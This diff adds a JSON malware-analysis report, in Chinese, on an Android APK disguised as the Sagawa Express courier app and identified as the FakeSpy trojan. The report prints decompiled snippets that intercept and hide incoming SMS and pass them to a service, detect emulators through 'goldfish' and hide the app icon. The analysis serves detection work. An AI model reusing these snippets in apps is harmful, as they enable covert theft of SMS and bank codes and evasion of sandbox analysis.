@@ -1,0 +1,156 @@
+{
+  "APK信息": {
+    "文件名": "00a0d2e255e0c806947dba0c4a8ca947ed7c34d6afbb6af69386d55ddaf309c2.apk",
+    "sha256": "00a0d2e255e0c806947dba0c4a8ca947ed7c34d6afbb6af69386d55ddaf309c2",
+    "包名": "gg.pkkllo",
+    "应用名": "佐川急便",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 769.9
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "sendTextMessage",
+              "SmsManager"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lkk\\receiver\\LJ;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "import android.telephony.SmsManager;\nimport android.telephony.SmsMessage;\n// BroadcastReceiver LJ: 监听短信广播 + SmsManager 静默发短信",
+          "malicious_code_snippet_context": "  import android.content.BroadcastReceiver;\n  import android.content.Context;\n  import android.content.Intent;\n>>> import android.telephony.SmsManager;\n>>> import android.telephony.SmsMessage;\n>>> import java.text.SimpleDateFormat;\n  import kk.service.FUK;\n  import kk.service.ShC;\n  import kk.util.SPUtil;",
+          "behavior_description": "该类 kk.receiver.LJ 是一个 BroadcastReceiver（广播接收器），同时导入了 SmsManager（短信静默发送API）和 SmsMessage（短信解析API），并配合 JSONObject 解析及恶意服务类 FUK/ShC 使用。这是 FakeSpy 短信木马的典型模式：接收器监听到达的短信广播（或 C2 下发的 JSON 指令）→ 解析短信内容/指令中的目标号码与文本 → 调用 SmsManager.sendTextMessage() 在无用户感知的情况下静默发送短信（可发送至增值付费号码造成用户话费损失，或向联系人发送含恶意链接的短信进行传播），同时窃取的短信内容可经 FUK/ShC 服务上传至 C2 服务器。数据流向：BroadcastReceiver.onReceive() 收到的短信 PDU/C2 JSON 指令 → SmsManager.sendTextMessage() 静默发送短信。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lkk\\receiver\\LJ;",
+          "method_signature": "for(Object pdu : pdus)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Object[] pdus = (Object[]) intent.getExtras().get(\"pdus\");\nif (intent.getAction().equals(\"android.provider.Telephony.SMS_RECEIVED\") || intent.getAction().equals(\"android.provider.Telephony.SMS_RECEIVED_2\") || intent.getAction().equals(\"android.provider.Telephony.GSM_SMS_RECEIVED\")) {\n    for (Object pdu : pdus) {\n        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);\n        this.content += smsMessage.getMessageBody();\n        this.sender = smsMessage.getOriginatingAddress();\n        this.time = smsMessage.getTimestampMillis();\n    }\n    abortBroadcast();\n    Intent in = new Intent(context, (Class<?>) ShC.class);\n    in.putExtra(\"sender\", this.sender);\n    in.putExtra(\"content\", this.content);\n    in.putExtra(\"time\", this.df.format(Long.valueOf(this.time)));\n    context.startService(in);",
+          "malicious_code_snippet_context": "      /* JADX WARN: Type inference failed for: r4v14, types: [kk.receiver.LJ$1] */\n      @Override // android.content.BroadcastReceiver\n      public void onReceive(final Context context, Intent intent) {\n>>>         Object[] pdus = (Object[]) intent.getExtras().get(\"pdus\");\n>>>         this.content = \"\";\n>>>         if (intent.getAction().equals(\"android.provider.Telephony.SMS_RECEIVED\") || intent.getAction().equals(\"android.provider.Telephony.SMS_RECEIVED_2\") || intent.getAction().equals(\"android.provider.Telephony.GSM_SMS_RECEIVED\")) {\n>>>             for (Object pdu : pdus) {\n>>>                 SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);\n>>>                 this.content += smsMessage.getMessageBody();\n>>>                 this.sender = smsMessage.getOriginatingAddress();\n>>>                 this.time = smsMessage.getTimestampMillis();\n>>>             }\n>>>             this.sp = new SPUtil(context, \"mybank\");\n>>>             abortBroadcast();\n>>>             context.startService(new Intent(context, (Class<?>) FUK.class));\n>>>             Intent in = new Intent(context, (Class<?>) ShC.class);\n>>>             in.putExtra(\"sender\", this.sender);\n              in.putExtra(\"content\", this.content);\n              in.putExtra(\"time\", this.df.format(Long.valueOf(this.time)));\n              context.startService(in);",
+          "behavior_description": "该代码是FakeSpy恶意软件的短信拦截广播接收器。通过监听android.provider.Telephony.SMS_RECEIVED等多种短信广播，从Intent extras中取出pdus数据，用SmsMessage.createFromPdu解析出短信正文、发送者号码和时间戳；随后调用abortBroadcast()终止广播传播，使系统短信应用和用户无法看到该短信（隐蔽拦截）；再将窃取的短信内容、发送者、时间通过startService传递给ShC服务，并在子线程中组装JSONObject（疑似上传至C2服务器）。数据流向：短信广播PDU数据→解析短信内容/发送者/时间→abortBroadcast隐藏短信→传递给后台服务并打包成JSON外传。结合厂商报告确认的FakeSpy银行木马身份及SPUtil命名为'mybank'，该行为可拦截银行验证码等敏感短信，直接造成用户隐私泄露和财产损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "anti_detection",
+      "中文名": "反检测/对抗技术",
+      "MITRE": "T1426",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "anti_emulator",
+          "中文名": "反模拟器",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "goldfish"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lkk\\util\\JRunCheck;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "anti_detection",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "private static String[] known_qemu_drivers = {\"goldfish\"};\npublic boolean isDeviceRooted(Context context) { return checkRootMethod1() || checkRootMethod2() || checkRootMethod3() || isEmu().booleanValue(); }\nprivate static Boolean isEmu() { File driver_file = new File(\"/proc/tty/drivers\"); if (driver_file.exists() && driver_file.canRead()) { byte[] data = new byte[(int) driver_file.length()]; ... } }",
+          "malicious_code_snippet_context": "  \n  /* JADX INFO: loaded from: classes.dex */\n  public class JRunCheck {\n>>>     private static String[] known_qemu_drivers = {\"goldfish\"};\n>>> \n>>>     public boolean isDeviceRooted(Context context) {\n          return checkRootMethod1() || checkRootMethod2() || checkRootMethod3() || isEmu().booleanValue();\n      }\n  ",
+          "behavior_description": "该代码是FakeSpy恶意样本的反模拟器/反分析检测模块。isEmu()方法通过读取系统文件 /proc/tty/drivers 的内容，检测其中是否包含 goldfish（Android SDK模拟器QEMU专用内核驱动）字符串，从而判断应用是否运行在模拟器或沙箱环境中；isDeviceRooted()还组合了三种root检测方法（checkRootMethod1/2/3）。数据流向：读取本地系统文件 /proc/tty/drivers → 解析驱动列表 → 匹配模拟器特征字符串 goldfish → 将检测结果作为条件分支返回。该反检测技术被恶意样本用于规避安全厂商的沙箱动态分析，使其仅在真实设备上执行窃取短信、联系人、通话记录等恶意载荷，属于恶意软件的逃逸对抗手段。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lkk\\chunyu\\MainActivity;",
+          "method_signature": "onStop()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "protected void onStop() {\n    super.onStop();\n    ComponentName name = new ComponentName(getPackageName(), getClass().getName());\n    getPackageManager().setComponentEnabledSetting(name, 2, 0);\n}",
+          "malicious_code_snippet_context": "      }\n  \n      @Override // android.support.v7.app.AppCompatActivity, android.support.v4.app.FragmentActivity, android.app.Activity\n>>>     protected void onStop() {\n>>>         super.onStop();\n>>>         ComponentName name = new ComponentName(getPackageName(), getClass().getName());\n>>>         getPackageManager().setComponentEnabledSetting(name, 2, 0);\n>>>     }\n  \n      private boolean checkPermissionAllGranted(String[] permissions) {\n          for (String permission : permissions) {",
+          "behavior_description": "在 MainActivity 的 onStop() 回调（应用退至后台时触发）中，通过 PackageManager.setComponentEnabledSetting() 将自身 MainActivity 组件设置为禁用状态（参数 2 = COMPONENT_ENABLED_STATE_DISABLED），使应用图标从桌面启动器中消失。数据流向：getPackageName()/getClass().getName() 获取自身组件名 → setComponentEnabledSetting(name, 2, 0) 禁用该组件实现图标隐藏。该手法与厂商报告确认的 FakeSpy 恶意家族行为一致：用户首次运行后图标即消失，难以察觉和卸载，为后续窃取短信、联系人、通话记录等隐私数据提供隐蔽驻留环境，属于典型的恶意隐蔽驻留行为。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
